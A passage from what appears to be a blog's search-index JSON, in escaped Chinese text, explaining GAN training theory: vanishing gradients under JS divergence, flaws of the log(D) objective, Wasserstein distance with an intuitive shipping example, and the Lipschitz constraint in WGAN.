<li>\u6d4b\u5ea6\uff1a\u53ef\u4ee5\u7406\u89e3\u4e3a\u957f\u5ea6/\u9762\u79ef/\u4f53\u79ef\u8fd9\u4e9b\u7ecf\u5178\u7a7a\u95f4\u4e2d\u7684\u6982\u5ff5\u5728\u9ad8\u7ef4\u7a7a\u95f4\u4e2d\u7684\u63a8\u5e7f\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u8d85\u4f53\u79ef\u3002\uff08\u5982\u679c\u5bf9\u7ebf\u6027\u4ee3\u6570\u719f\u6089\u7684\u8bdd\uff0c\u6211\u4eec\u77e5\u9053\u884c\u5217\u5f0f\u672c\u8d28\u4e0a\u4e5f\u662f\u5728\u8ba1\u7b97\u4e00\u4e2a\u8d85\u4f53\u79ef\u3002\uff09</li> </ul> <p>\u4e3a\u4ec0\u4e48\u8981\u7528\u652f\u6491\u96c6\u8fd9\u6837\u7684\u6982\u5ff5\u5462\uff1f\u56e0\u4e3a\u50cf\u56fe\u7247\u8fd9\u6837\u7684\u9ad8\u7ef4\u5411\u91cf\uff0c\u4ee5 64*64 \u7684\u56fe\u7247\u4e3a\u4f8b\uff084096 \u7ef4\uff09\uff0c\u5e76\u4e0d\u662f\u968f\u4fbf\u62ff\u4e00\u4e2a 4096 \u7ef4\u7684\u5411\u91cf\uff0c\u5b83\u5c31\u662f\u4e00\u4e2a\u5bf9\u4eba\u7c7b\u6765\u8bf4\u6709\u201c\u610f\u4e49\u201d\u7684\u56fe\u7247\u3002\u5f53\u6211\u4eec\u770b\u5230\u4e00\u5f20\u732b\u7684\u56fe\u7247\uff08\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u6ee1\u8db3\u4e00\u5b9a\u7279\u5f81\u7684\u5411\u91cf\uff09\u6211\u4eec\u4f1a\u8bf4\u8fd9\u662f\u732b\uff0c\u5f53\u6211\u4eec\u770b\u5230\u4e00\u4e2a\u968f\u673a\u751f\u6210\u7684 4096 \u7ef4\u5411\u91cf\uff0c\u6211\u4eec\u5927\u591a\u65f6\u5019\u770b\u5230\u7684\u5c31\u662f\u4e00\u5806\u4e71\u4e03\u516b\u7cdf\u7684\u50cf\u7d20\u70b9\u3002\u6240\u4ee5\u5bf9\u4e8e\u56fe\u7247\u7684\u6982\u7387\u5206\u5e03\u6765\u8bf4\uff0c\u8fd9\u4e2a 4096 \u7ef4\u7684\u5411\u91cf\u7a7a\u95f4\u4e2d\uff0c\u5927\u90e8\u5206\u7684\u6982\u7387\u503c\u5e94\u8be5\u90fd\u662f 0\uff0c\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002</p> <p>\u90a3\u4e48\uff0c\u5f88\u5bb9\u6613\u5c31\u4f1a\u60f3\u5230\uff0c\u5bf9\u4e8e\u771f\u5b9e\u56fe\u7247\u7684\u6982\u7387\u5206\u5e03\uff0c\u5176\u652f\u6491\u96c6\u53ef\u80fd\u53ea\u662f\u8fd9\u4e2a\u9ad8\u7ef4\u7a7a\u95f4\u4e2d\u7684\u4e00\u4e2a\u4f4e\u7ef4\u6d41\u5f62\uff08\u771f\u5b9e\u56fe\u7247\u53ea\u6709\u53ef\u80fd\u5206\u5e03\u5728\u4e00\u4e2a\u8fd9\u4e2a\u7a7a\u95f4\u4e2d\u7684\u4e00\u4e2a\u4f4e\u7ef4\u5ea6\u8d85\u51e0\u4f55\u9762\u4e0a\uff0c\u5176\u5b83\u5730\u65b9\u6982\u7387=0\uff09\u3002</p> <p>\u66f4\u76f4\u89c2\u4e00\u70b9\u6765\u8bf4\uff0c\u5c31\u662f\uff1a\u65e2\u7136\u771f\u5b9e\u56fe\u7247\u53ea\u662f\u5176\u6240\u5728\u7684\u7a7a\u95f4\u7684\u4e00\u4e2a\u975e\u5e38\u5c0f\u7684\u96c6\u5408\u4e2d\uff0c\u90a3\u4e48\u53ef\u80fd\u6211\u4eec\u6839\u672c\u5c31\u4e0d\u9700\u8981\u8fd9\u4e48\u9ad8\u7ef4\u5ea6\u7684\u5411\u91cf\u6765\u8868\u8fbe\u5b83\uff0c\u4e00\u4e2a\u66f4\u4f4e\u7ef4\u5ea6\u7684\u7f16\u7801\u5c31\u591f\u4e86\uff0c\u7528\u50cf\u7d20\u77e9\u9635\u6765\u8868\u8fbe\u4e00\u4e2a\u56fe\u7247\u5bf9\u8c61\u662f\u4e00\u4e2a\u975e\u5e38\u4f4e\u6548\u7684\u624b\u6bb5\u3002\u5b9e\u9645\u4e0a\u5df2\u7ecf\u6709\u8bb8\u591a\u4f8b\u5b50\u80fd\u591f\u4e3a\u6b64\u63d0\u4f9b\u652f\u6301\uff0c\u5176\u4e2d\u6700\u6709\u4ee3\u8868\u6027\u7684\u5e94\u8be5\u662f\u56fe\u50cf\u538b\u7f29\u3002\u4ee5 JPEG \u538b\u7f29\u4e3a\u4f8b\uff0c\u5728\u6709\u4e9b\u4f8b\u5b50\u4e2d\uff0c\u5b83\u53ef\u4ee5\u5c06\u4e00\u4e2a bmp \u683c\u5f0f\u7684\u56fe\u7247\u7684\u5927\u5c0f\u538b\u7f29 20 \u500d\uff0c\u867d\u7136\u5b83\u662f\u6709\u635f\u538b\u7f29\uff0c\u4f46\u662f\u89e3\u538b\u540e\u8089\u773c\u57fa\u672c\u4e0a\u770b\u4e0d\u51fa\u538b\u7f29\u524d\u540e\u7684\u533a\u522b\uff01</p> <p>\u800c\u539f\u8bba\u6587\u4e2d\u60f3\u8981\u8868\u8fbe\u7684\u5c31\u662f\uff1a\u65e2\u7136\u56fe\u7247\u5206\u5e03\u662f\u4f4e\u4f4d\u6d41\u5f62\uff0c\u90a3\u4e48\u4e24\u4e2a\u4f4e\u7ef4\u6d41\u5f62\u7684\u4ea4\u53e0\u76f8\u5bf9\u4e8e\u8fd9\u4e2a\u4f4e\u7ef4\u6d41\u5f62\u800c\u8a00\uff0c\u671f\u671b\u6d4b\u5ea6\u662f 0\u3002\u6bd4\u5982\u8bf4\u5728\u4e8c\u7ef4\u5e73\u9762\u4e0a\u968f\u4fbf\u53d6\u4e24\u6761\u66f2\u7ebf\u6bb5\uff0c\u8fd9\u4e24\u6761\u66f2\u7ebf\u6bb5\u53ef\u80fd\u4f1a\u6709\u6709\u9650\u7684\u76f8\u4ea4\u70b9\uff0c\u4f46\u662f\u8fd9\u4e9b\u6709\u9650\u7684\u76f8\u4ea4\u70b9\u7684\u201c\u957f\u5ea6\u201d\u76f8\u6bd4\u4e8e\u8fd9\u4e2a\u66f2\u7ebf\u6bb5\u5fae\u4e0d\u8db3\u9053\u3002\u539f\u8bba\u6587\u7684\u8bc1\u660e\u5176\u5b9e\u5c31\u662f\u628a\u8fd9\u4e2a\u76f4\u89c2\u7684\u611f\u53d7\u63a8\u5e7f\u5230\u4e86\u9ad8\u7ef4\u7a7a\u95f4\u4e2d\u3002</p> <p>\u81f3\u6b64\uff0c\u6211\u4eec\u7ec8\u4e8e\u77e5\u9053\u4e3a\u5565 D \u8bad\u7ec3\u5f97\u592a\u597d\uff0cG \u5c31\u8bad\u7ec3\u4e0d\u52a8\u4e86\u3002\u56e0\u4e3a D \u8bad\u7ec3\u5f97\u8d8a\u597d\uff0c\u8bad\u7ec3 G \u65f6\u7684\u76ee\u6807\u51fd\u6570\u5c31\u8d8a\u8d34\u8fd1\u4e0a\u9762\u6211\u4eec\u63a8\u5bfc\u51fa\u7684 JS \u6563\u5ea6\u3002\u800c\u8fd9\u4e2a\u6563\u5ea6\u867d\u7136\u7406\u8bba\u4e0a\u770b\u8d77\u6765\u5f88\u597d\uff0c\u53ea\u8981\u4e0d\u65ad\u964d\u4f4e\uff0c\u5c31\u80fd\u591f\u8ba9\u4e24\u4e2a\u5206\u5e03\u8d34\u5728\u4e00\u8d77\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u7531\u4e8e\u4e24\u4e2a\u5206\u5e03\u7684\u4ea4\u53e0\u51e0\u4e4e\u603b\u662f\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1\uff0c\u6240\u4ee5\u5bfc\u81f4\u8fd9\u4e2a\u6563\u5ea6\u6839\u672c\u964d\u4e0d\u52a8\u3002</p> <p>\u56e0\u6b64\uff0c\u521d\u4ee3\u7684 GAN \u8bad\u7ec3\u8fc7\u7a0b\u4e2d\u9700\u8981\u975e\u5e38\u5c0f\u5fc3\u7684\u5e73\u8861 D \u548c G \u7684\u8bad\u7ec3\uff0c\u5982\u679c\u4ee5\u6765 D \u5c31\u8bad\u7ec3\u5f97\u592a\u597d\uff0c\u90a3\u4e48 G \u6839\u672c\u8bad\u7ec3\u4e0d\u52a8\uff0c\u5982\u679c D \u8d28\u91cf\u5f88\u5dee\uff0cG \u4ece D \u90a3\u91cc\u5f97\u5230\u7684\u68af\u5ea6\u6307\u5f15\u4e5f\u4f1a\u4e0d\u591f\u51c6\u786e\uff0c\u5bfc\u81f4 G \u7684\u8bad\u7ec3\u6548\u679c\u4e00\u822c\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#logd-\u5b58\u5728\u7684\u95ee\u9898","title":"log(D) \u5b58\u5728\u7684\u95ee\u9898","text":"<p>\u90a3\u4e48 Goodfellow \u63d0\u51fa\u7684\u5907\u9009\u9879 : logD \u53c8\u5982\u4f55\u5462\uff1f</p> <p>\u8fd8\u662f\u6309\u7167\u4e0a\u9762\u7684\u65b9\u6cd5\uff0c\u505a\u4e00\u4e2a\u7b80\u5355\u7684\u53d8\u5f62\uff0c\u5c31\u53ef\u4ee5\u5bfc\u51fa\uff0c\u5f53 D \u6700\u4f18\u7684\u65f6\u5019\uff0cG \u7684\u76ee\u6807\u51fd\u6570\u7b49\u4ef7\u4e8e\uff1a</p> \\[ KL(p_g||p_{data})-2JS(p_{data}||p_g) \\] <p>\u6700\u5c0f\u5316\u8fd9\u4e2a\u76ee\u6807\u51fd\u6570\u4f1a\u53d8\u5f97\u5f88\u6ed1\u7a3d\u3002</p> <p>\u4e00\u65b9\u9762\u6211\u4eec\u5e0c\u671b\u6700\u5c0f\u5316 KL\uff0c\u53e6\u4e00\u65b9\u9762\u53c8\u5e0c\u671b\u6700\u5927\u5316 JS\u3002\u76f4\u89c2\u4e0a\u6765\u770b\uff0c\u6211\u4eec\u53c8\u5e0c\u671b\u5c06\u4e24\u4e2a\u5206\u5e03\u8d34\u7d27\uff0c\u53c8\u5e0c\u671b\u5c06\u5b83\u4eec\u4e24\u4e2a\u62c9\u5f00\u3002\u3002\u3002</p> <p>\u6240\u4ee5\u663e\u7136\u5f53\u5e74 Goodfellow \u63d0\u51fa\u7684\u8fd9\u4e2a\u201c\u6539\u8fdb\u201d\u5b8c\u5168\u662f\u51ed\u611f\u89c9\u778e\u626f\u7684\u3002\u5b83\u907f\u514d\u4e86\u539f\u6765\u7684\u90a3\u4e2a\u88f8\u7684 JS\uff0c\u6240\u4ee5\u89e3\u51b3\u4e86\u68af\u5ea6\u6d88\u5931\u7684\u95ee\u9898\uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u4e92\u76f8\u77db\u76fe\u7684\u76ee\u6807\u4e5f\u81ea\u7136\u6700\u540e\u4e5f\u4f1a\u8ba9\u6211\u4eec\u5f97\u5230\u4e0d\u7a33\u5b9a\u7684\u68af\u5ea6\u6ce2\u52a8\u3002\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#wasserstein-gan","title":"Wasserstein GAN","text":"<p>Arjovsky \u5728\u300aTOWARDS PRINCIPLED METHODS FOR TRAINING GENERATIVE ADVERSARIAL NETWORKS\u300b(Arjovsky et al. 2017) \u8fd8\u8ba8\u8bba\u4e86\u4e00\u4e9b\u522b\u7684\u95ee\u9898\uff0c\u5e76\u4e14\u4e5f\u63d0\u51fa\u4e86\u4e00\u4e9b\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u7684\u601d\u8def\u548c\u65b9\u6cd5\u3002\u9650\u4e8e\u7b14\u8005\u5b9e\u529b\u548c\u7cbe\u529b\u6709\u9650\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\uff0c\u6709\u5174\u8da3\u53ef\u4ee5\u9605\u8bfb\u539f\u8bba\u6587\u3002</p> <p>\u8fd9\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5c06\u4ecb\u7ecd WGAN\u3002WGAN \u7684\u63d0\u51fa\u8005\u4e5f\u662f Arjovsky \u7b49\u4eba\uff0c\u5728\u53d1\u4e86\u4e0a\u9762\u8fd9\u7bc7 paper \u540e\uff0c\u4ed6\u53c8\u7acb\u523b\u53d1\u8868\u4e86 \u300aWasserstein GAN\u300b(Arjovsky et al. 2017)\u3002</p> <p>Wasserstein GAN\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5176\u5b9e\u5c31\u662f\u628a\u6982\u7387\u5206\u5e03\u95f4\u7684\u8ddd\u79bb\u5ea6\u91cf\u6539\u6210\u4f7f\u7528\u201cWasserstein Distance\u201d\u6765\u8861\u91cf\u7684 GAN\u3002\u8fd9\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u4f1a\u7b80\u5355\u7684\u4ecb\u7ecd Wasserstein Distance \u53ca\u5176\u76f8\u5bf9\u4e8e\u5176\u5b83\u7c7b\u578b\u8ddd\u79bb\u5b9a\u4e49\u7684\u4f18\u52bf\u3002\u6700\u540e\u6211\u4eec\u4f1a\u4ecb\u7ecd WGAN \u7684\u57fa\u672c\u601d\u8def\u548c\u6d41\u7a0b\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#wasserstein-distance","title":"Wasserstein Distance","text":"<p>\u539f\u8bba\u6587\u4e2d\uff0c\u4f5c\u8005\u7b80\u5355\u7684\u8d34\u51fa\u4e86 Wasserstein Distance \u7684\u5b9a\u4e49\uff0c\u4e4d\u4e00\u770b\u53cd\u6b63\u5c31\u662f\u4e00\u4e2a\u6570\u5b66\u8868\u8fbe\u5f0f\uff0c\u6c42\u7684\u662f\u4e00\u4e2a\u5411\u91cf\u95f4\u8ddd\u79bb\u7684\u671f\u671b\u4e0b\u786e\u754c\u3002\u3002\u3002</p> <p>WD \u4e5f\u88ab\u79f0\u4e3a\u63a8\u571f\u673a\u8ddd\u79bb\uff08Earth-Mover Distance\uff09\uff0c\u662f\u4fe1\u606f\u8bba\u91cc\u9762\u7684\u4e00\u4e2a\u5b9a\u4e49\u3002\u641c\u4e00\u4e0b\u8fd9\u4e2a\u4e1c\u897f\uff0c\u4f60\u4f1a\u53d1\u73b0\u8fd8\u6709\u5f88\u591a\u5e94\u7528\u4e2d\u90fd\u7528\u5230\u4e86\u5b83\uff0c\u5b83\u672c\u8d28\u4e0a\u662f\u4ece\u6700\u4f18\u4f20\u8f93\u95ee\u9898\u5bfc\u51fa\u7684\u3002\u4e0a\u9762\u6211\u4eec\u8bf4\u4e86\u8fd9\u4e2a\u5f0f\u5b50\u5c31\u662f\u8981\u6c42\u4e00\u4e2a\u671f\u671b\u7684\u4e0b\u786e\u754c\uff0c\u5bf9\u4e8e\u8fd9\u4e2a\u671f\u671b\u6765\u8bf4\uff0c\u5176\u6240\u4f9d\u8d56\u7684\u8054\u5408\u6982\u7387\u5206\u5e03\u662f\u4e00\u4e2a\u53c2\u6570\uff0c\u8fd9\u91cc\u8981\u6c42\u4e00\u4e2a\u4e0b\u786e\u754c\uff0c\u5c31\u662f\u8981\u6c42\u4e00\u4e2a\u6700\u4f18\u8054\u5408\u6982\u7387\u5206\u5e03\u6765\u4f7f\u5f97\u6574\u4e2a\u4f20\u8f93\u65f6\u6700\u4f18\u7684\u3002\u800c\u8fd9\u4e2a\u6700\u4f18\u6982\u7387\u4f20\u8f93\u4ee3\u4ef7\u53ef\u4ee5\u4f5c\u4e3a\u4e24\u4e2a\u6982\u7387\u5206\u5e03\u4e4b\u95f4\u7684\u5dee\u5f02\u7684\u67d0\u79cd\u5f62\u5f0f\u7684\u5ea6\u91cf\u3002\u6709\u5174\u8da3\u53ef\u4ee5\u53c2\u8003\u4e00\u4e0b\u8fd9\u7bc7\u6587\u7ae0\uff1a\u300a\u4f20\u8bf4\u4e2d\u7684\u63a8\u571f\u673a\u8ddd\u79bb\u57fa\u7840\uff0c\u6700\u4f18\u4f20\u8f93\u7406\u8bba\u4e86\u89e3\u4e00\u4e0b\u300b\u3002</p> <p>\u7528\u6700\u4f18\u4f20\u8f93\u4ee3\u4ef7\u4e3a\u4ec0\u4e48\u80fd\u8861\u91cf\u5206\u5e03\u8ddd\u79bb\uff1f</p> <p>\u5047\u8bbe\u6211\u4eec\u662f\u4e00\u4e2a\u7535\u5546\u5e73\u53f0\uff0c\u6211\u4eec\u8fd0\u8425\u7740\u81ea\u5df1\u7684\u4ed3\u5e93\uff0c\u6211\u4eec\u5f53\u7136\u5e0c\u671b\u5168\u56fd\u5404\u5730\u7684\u4ed3\u5e93\u4e2d\u5546\u54c1\u7684\u5206\u5e03\u5c3d\u91cf\u548c\u5404\u5730\u7684\u9700\u6c42\u8d34\u5408\u3002\u6bd4\u5982\u8bf4 A \u57ce\u5bf9\u5546\u54c1\u9700\u6c42\u91cf\u4e3a x\uff0c\u6211\u4eec\u5f53\u7136\u5e0c\u671b A \u57ce\u7684\u4ed3\u5e93\u6b63\u597d\u6709 x \u4ef6\u5546\u54c1\u6765\u6ee1\u8db3\u9700\u6c42\u3002</p> <p>\u5982\u679c\u6211\u4eec\u628a n \u4e2a\u57ce\u5e02\u7684\u4ed3\u5e93\u5e93\u5b58\u8868\u793a\u4e3a\u4e00\u4e2a n \u7ef4\u5411\u91cf X\uff0c\u5546\u54c1\u9700\u6c42\u4e5f\u8868\u793a\u4e3a\u4e00\u4e2a n \u7ef4\u5411\u91cf Y\uff0c\u90a3\u4e48\u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b80\u5355\u8bc4\u4f30\u5e93\u5b58\u5206\u914d\u7684\u65b9\u6cd5\u5c31\u662f\u8ba1\u7b97\\(||X-Y||\\)\uff0c\u8fd9\u4e2a\u5411\u91cf\u8ddd\u79bb\u8303\u6570\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u8861\u91cf\u4e86\u5e93\u5b58\u5206\u5e03\u548c\u5546\u54c1\u9700\u6c42\u5206\u5e03\u7684\u8d34\u5408\u7a0b\u5ea6\u3002</p> <p>\u4f46\u662f\uff0c\u8fd9\u4e2a\u8303\u6570\u53ef\u80fd\u8bc4\u4f30\u5f97\u5e76\u4e0d\u90a3\u4e48\u7cbe\u786e\u3002</p> <p>\u5047\u8bbe\u73b0\u5728 n \u4e2a\u57ce\u5e02\u91cc\uff0c\u6709 n-2 \u4e2a\u57ce\u5e02\u5e93\u5b58\u548c\u9700\u6c42\u90fd\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u6709\u4e24\u4e2a\u57ce\u5e02\uff0c\u6bd4\u5982\u897f\u85cf\u548c\u5317\u4eac\uff0c\u5176\u4e2d\u897f\u85cf\u9700\u6c42\u91cf\u6bd4\u5e93\u5b58\u5927 1\uff0c\u5317\u4eac\u7684\u5e93\u5b58\u6bd4\u9700\u6c42\u91cf\u5927 1\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ece\u5317\u4eac\u8fd0\u9001 1 \u4e2a\u5355\u4f4d\u7684\u5546\u54c1\u5230\u897f\u85cf\uff0c\u6b64\u65f6\u5f97\u5230\u8303\u6570\u503c\\(||X-Y||=1\\)\u3002</p> <p>\u518d\u8003\u8651\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u8fd9\u4e24\u4e2a\u57ce\u5e02\u4e0d\u662f\u5317\u4eac\u548c\u897f\u85cf\uff0c\u800c\u662f\u5317\u4eac\u548c\u5929\u6d25\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u628a\u4e00\u4e2a\u5355\u4f4d\u7684\u5546\u54c1\u4ece\u5317\u4eac\u8fd0\u9001\u5230\u5929\u6d25\u3002\u6b64\u65f6\\(||X-Y||\\)\u4f9d\u7136\u662f 1\u3002</p> <p>\u6211\u4eec\u5f88\u5feb\u5c31\u4f1a\u53d1\u73b0\u4e00\u4e2a\u95ee\u9898\u3002\u5982\u679c\u628a\u8d27\u7269\u4ece\u5317\u4eac\u53d1\u9001\u5230\u5929\u6d25\u6240\u9700\u8981\u7684\u4ee3\u4ef7\u80af\u5b9a\u663e\u8457\u4f4e\u4e8e\u4ece\u5317\u4eac\u53d1\u5f80\u897f\u85cf\uff0c\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u540e\u8005\u7684\u5206\u5e03\u5e94\u8be5\u4f18\u4e8e\u524d\u8005\u7684\u5206\u5e03\uff0c\u4f46\u662f\u5982\u679c\u7b80\u5355\u7684\u7528\u4e00\u4e2a\u8ddd\u79bb\u8303\u6570\u6765\u8868\u8fbe\uff0c\u65e0\u6cd5\u4f53\u73b0\u8fd9\u79cd\u5dee\u522b\u3002</p> <p>\u6211\u4eec\u628a\u672c\u5730\u53d1\u8d27\u7684\u4ee3\u4ef7\u8bbe\u4e3a 0\uff0c\u628a\u5317\u4eac\u5230\u897f\u85cf\u7684\u4ee3\u4ef7\u8bbe\u4e3a 100\uff0c\u5317\u4eac\u5230\u5929\u6d25\u7684\u4ee3\u4ef7\u4e3a 10\u3002\u90a3\u4e48\u7528\u6700\u4f18\u4f20\u8f93\u4ee3\u4ef7\u6765\u8bc4\u4f30\uff0c\u524d\u8005\u7684\u4ee3\u4ef7\u662f 100\uff0c\u540e\u8005\u4ee3\u4ef7\u662f 10\uff0c\u6211\u4eec\u4fbf\u80fd\u4f53\u73b0\u51fa\u540e\u8005\u7531\u4e8e\u524d\u8005\u8fd9\u4e00\u7279\u6027\u3002</p> <p>\u8fd9\u5c31\u662f\u6700\u4f18\u4f20\u8f93\u4ee3\u4ef7\u7528\u6765\u8861\u91cf\u5206\u5e03\u8ddd\u79bb\u7684\u76f4\u89c2\u7406\u89e3\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#wd-\u7684\u4f18\u52bf","title":"WD \u7684\u4f18\u52bf","text":"<p>\u539f\u8bba\u6587\u5728\u5f15\u51fa WGAN \u4e4b\u524d\uff0c\u5148\u5bf9\u6bd4\u4e86\u56db\u79cd\u8ddd\u79bb\u5b9a\u4e49\u7684\u8868\u73b0\u3002\u8003\u8651\u5230\u5176\u4e2d\u4e00\u79cd TVD \u5bf9\u4e8e\u6211\u4eec\u7406\u89e3 WGAN \u5e76\u6ca1\u6709\u4ec0\u4e48\u7279\u522b\u5fc5\u8981\uff0c\u6211\u4eec\u8fd9\u91cc\u4e3b\u8981\u6bd4\u8f83\u4e00\u4e0b\u4e09\u79cd\u8ddd\u79bb\uff1aKL Divergence\uff0cJS Divergence\uff0cWasserstein Distance (Earth-Mover Distance)\u3002</p> <p></p> <p></p> <p>\u539f\u4f5c\u8005\u4e3e\u4e86\u4e0a\u9762\u8fd9\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u6709\u4e24\u4e2a\u4e0d\u91cd\u53e0\u7684\u6982\u7387\u5206\u5e03\u3002\uff08\u539f\u8bba\u6587\u6ca1\u6709\u7ed9\u4e0a\u9762\u7684\u793a\u610f\u56fe\uff0c\u8fd9\u5f20\u793a\u610f\u56fe\u6e90\u81ea\u4e00\u7bc7\u77e5\u4e4e\u7684\u6587\u7ae0\u300a\u4ee4\u4eba\u62cd\u6848\u53eb\u7edd\u7684 Wasserstein GAN\u300b\uff09</p> <p>\u6211\u4eec\u5c06\u770b\u5230 JSD\uff0cKLD \u548c WD \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u8868\u73b0\u51fa\u6765\u7684\u5dee\u5f02\uff1a</p> <p></p> <p></p> <p>\u5bf9\u4e8e JS \u6211\u4eec\u524d\u9762\u5df2\u7ecf\u5206\u6790\u8fc7\u4e86\uff0c\u53ea\u8981\u4e0d\u76f8\u4ea4\uff0c\u4e0d\u7ba1\u8ddd\u79bb\u662f\u591a\u5c11\uff0c\u59cb\u7ec8\u7b49\u4e8e log2\uff0c\u6839\u672c\u4e0d\u80fd\u4f53\u73b0\u8ddd\u79bb\u5e26\u6765\u7684\u5dee\u522b\uff0c\u6240\u4ee5\u4e00\u65e6\u5206\u5f00\u4e86\uff0c\u5c31\u4e0d\u80fd\u901a\u8fc7\u68af\u5ea6\u62c9\u56de\u6765\uff0c\u6240\u4ee5\u8bad\u7ec3 G \u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u68af\u5ea6\u6d88\u5931\u3002</p> <p>\u5bf9\u4e8e KL\uff0c\u4e5f\u5f88\u5bb9\u6613\u9a8c\u8bc1\uff0c\u5f53\u5b8c\u5168\u4e0d\u76f8\u4ea4\u65f6\uff0c\u68af\u5ea6\u4f1a\u8d8b\u4e8e\u65e0\u7a77\uff0c\u5bfc\u81f4\u68af\u5ea6\u7206\u70b8\u3002</p> <p>\u800c WD \u5374\u4f53\u73b0\u51fa\u4e86\u975e\u5e38\u4f18\u79c0\u7684\u6027\u8d28\uff0c\u5b83\u5b8c\u5168\u662f\u548c\u8ddd\u79bb\u5448\u6b63\u76f8\u5173\u7684\uff0c\u63d0\u4f9b\u4e86\u8fde\u7eed\u5e73\u6ed1\u7684\u68af\u5ea6\u3002</p> <p>\u7531\u6b64\u53ef\u89c1\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528 WD \u6765\u4f5c\u4e3a\u76ee\u6807\u51fd\u6570\u5f15\u5bfc\\(p_g\\)\u548c\\(p_{data}\\)\u7684\u62df\u5408\uff0c\u5c31\u80fd\u5f88\u597d\u7684\u907f\u514d\u68af\u5ea6\u6d88\u5931\u6216\u8005\u68af\u5ea6\u7206\u70b8\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#wgan","title":"WGAN","text":"<p>\u524d\u9762\u6211\u4eec\u8bf4\u4e86\uff0cWGAN \u5c31\u662f\u628a\u521d\u4ee3 GAN \u7684 loss \u6362\u6389\uff0c\u4e0d\u518d\u4f7f\u7528 JS \u6563\u5ea6\u4f5c\u4e3a\u76ee\u6807\uff0c\u53d6\u800c\u4ee3\u4e4b\uff0c\u91c7\u7528 Wasserstein Distance \u6765\u4f5c\u4e3a\u76ee\u6807\u3002</p> <p>\u4f46\u662f\u5e76\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355\u3002\u3002\u3002\u8fd8\u8bb0\u5f97 Wasserstein Distance \u4e2d\u8981\u6c42\u4e00\u4e2a\u4e0b\u786e\u754c\u5417\uff1f\u8fd9\u4e1c\u897f\u5e76\u4e0d\u80fd\u76f4\u63a5\u6c42\u89e3\u3002\u3002</p> <p></p> <p></p> <p>\u5982\u4e0a\uff0c\u867d\u7136 WD \u5e76\u4e0d\u80fd\u76f4\u63a5\u7b97\u51fa\u6765\u3002\u4f46\u662f\u4f5c\u8005\u5728\u539f\u6587\u4e2d\u4f7f\u7528\u4e86 Kantorovich-Rubinstein duality\uff08\u8fd9\u4e2a\u4e1c\u897f\u6709\u5174\u8da3\u53ef\u4ee5\u81ea\u5df1\u53bb\u770b\u8fd9\u7bc7\u6587\u7ae0\uff0c\u539f paper \u8fd9\u90e8\u5206\u5f15\u7528\u4e86\u8fd9\u672c\u4e66\uff1a\u300aOptimal Transport - Old and New\u300b\uff0c\u636e\u8bf4\u662f\u5199\u4e2a\u6570\u5b66\u7cfb phd \u770b\u7684\uff0c998 \u9875\u3002\"Have fun and good luck!!!\"\uff09\uff0c\u4e8e\u662f WD \u8ddd\u79bb\u7684\u8ba1\u7b97\u5c31\u5f52\u7ed3\u4e3a\u53e6\u4e00\u4e2a\u7b49\u4ef7\u5bf9\u5076\u5f0f\u7684\u8ba1\u7b97\uff1a</p> <p></p> <p>\u6216\u8005\u4e5f\u53ef\u4ee5\u7528\uff1a</p> <p></p> <p>\u8fd9\u91cc\u7684\\(f\\)\u662f\u4e00\u4e2a\u6ee1\u8db3 Lipschitz \u8fde\u7eed\u7684\u51fd\u6570\u3002</p> <p>\u6240\u8c13\u7684 Lipschitz \u8fde\u7eed\uff0c\u5c31\u662f\u5bf9\u4e8e\u4e00\u4e2a\u5e38\u6570 K\uff0c\u51fd\u6570\u5728\u5b9a\u4e49\u57df\u4e2d\u4efb\u610f\u4e24\u4e2a\u5143\u7d20\\(x_1,x_2\\)\u4e0a\u90fd\u8981\u6ee1\u8db3\uff1a</p> \\[ |f(x_1)-f(x_2)|\\leq K|x_1-x_2| \\] <p>K \u88ab\u79f0\u4e3a Lipschitz \u5e38\u6570\uff0c\u4e0a\u9762\u7684\u8868\u8fbe\u5f0f\u4e2d\uff0c\u8981\u6c42 \\(f\\) \u6ee1\u8db3\u5bf9\u4e8e\u4e00\u4e2a\u56fa\u5b9a\u5927\u5c0f\u7684 Lipschitz \u5e38\u6570\u6ee1\u8db3 Lipschitz \u8fde\u7eed\u3002\u4ece Lipschitz 